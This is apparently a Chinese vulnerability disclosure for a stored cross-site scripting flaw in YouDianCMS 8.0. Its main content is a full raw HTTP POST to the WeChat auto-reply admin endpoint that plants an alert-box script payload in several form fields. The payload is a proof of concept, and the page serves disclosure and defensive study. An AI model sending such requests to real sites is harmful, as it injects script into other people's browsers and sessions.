<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>YouDianCMS 8.0 Storeage XSS</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>YouDianCMS 8.0</p><h2>三、复现过程</h2><p>POST /index.php/Admin/wx/saveSubscribeReply <br />HTTP/1.1 Host: 127.0.0.1 <br />User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 <br />Accept: application/json, text/javascript, /; q=0.01 <br />Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 <br />Referer: http://0-sec.org/index.php/Admin/Wx/subscribereply/l/en/random/1560696407129 <br />X-Requested-With: XMLHttpRequest <br />Content-Type: multipart/form-data; <br />boundary=---------------------------17443203555821 <br />Content-Length: 2207 <br />DNT: 1 <br />Connection: close <br />Cookie: PHPSESSID=bkv171om25ji6a51t7dql010h2; youdianAdminLangSet=en; CKFinder_Path=Files%3A%2F%3A1; CKFinder_Settings=TNNDS; youdianMenuTopID=15<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="ReplyID"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="TypeID"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="a1"<br /><br />"&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name="a2"<br /><br />2 -----------------------------17443203555821 Content-Disposition: form-data; name="a3"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="a4"<br /><br />"&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name="a5"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="a6"<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="musicfile"<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="a11"<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="a12"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="a13"<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="a14"<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="a15"<br /><br />"&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name="a16"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="a7"<br /><br />2 -----------------------------17443203555821 Content-Disposition: form-data; name="a8"<br /><br />2,大转盘 -----------------------------17443203555821 Content-Disposition: form-data; name="a10"<br /><br />-----------------------------17443203555821 Content-Disposition: form-data; name="a9"<br /><br />"&gt;&lt;scRIPT&gt;alert(1)&lt;/SCRIPT&gt; -----------------------------17443203555821 Content-Disposition: form-data; name="IsEnable"<br /><br />1 -----------------------------17443203555821 Content-Disposition: form-data; name="hash"<br /><br />19b37a0a1054dfd209b9a17c704027f3_db90bddc24f4e98592b355e2cbbca612 -----------------------------17443203555821--</p><p>该漏洞触发的位置在“微信平台”-“自动回复”-“跟踪自动回复”的“微信短信”中，最后点击保存触发。</p><h2>四、参考链接</h2><p><a href="https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2">https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2</a></p></body></html>